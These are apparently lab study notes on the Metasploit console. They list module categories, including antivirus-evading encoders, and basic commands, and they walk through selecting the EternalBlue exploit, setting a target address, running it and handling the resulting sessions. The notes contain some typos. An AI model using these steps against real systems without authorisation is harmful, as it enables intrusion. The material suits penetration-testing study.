# Launch Metasploit console
msfconsole

# Modules and categories:
# Auxiliary: Any supporting module, such as scanners, crawlers, and fuzzers
/opt/metsploit-framework-5101/modules# tree -L 1 auxiliary
# Encoders: allow you to endoe the exploit and payload to avoid siganture-based antivirus
/opt/metsploit-framework-5101/modules# tree -L 1 encoders
# Evasion: evades antivirus
/opt/metsploit-framework-5101/modules# tree -L 2 evasion
# Exploits: Exploits, organized by the target system
/opt/metsploit-framework-5101/modules# tree -L 1 exploits
# Payloads: code that will run on the target system
/opt/metsploit-framework-5101/modules# tree -L 1 payloads
	# Singles: Self-contained payloads that do not need additonal components
	# Stagers: sets up connextion between MS and the target system
	# Stages: Downloaded by the stager


# Help command can be used on own or for a specific command
help
help set

# History command to see what you have typed
history

# Module to use can be selected w/ use
use exploit/windows/smb/ms17_010_eternalblue
# Context is then set, can use show options
show options
show payloads
# Leave context using nack
back

# Info for further context of module
info
# Search is used for modules
search ms17_010
search cve*
search type:auxiliary telnet

# Set parameters
set <PARAMETER_NAME> <VALUE>
set rhosts 10.10.165.39
 # Override any set parameters w/ unset
 unset all

 # Setg allow you to set the value so it can default across different modules
 setg
 unsetg

 # run exploit with exploit, or exploit -z to background the session
 exploit
 exploit -z

 # Some modules support check to see if target is vulnerable without exploit
 check

 # Use background to background the session and return to msfconsole
 background
 CTRL+Z

 # sessions can be used to see existing sessions
 sessions
 # To interact, use sessions -i followed by the session
sessions -i 2



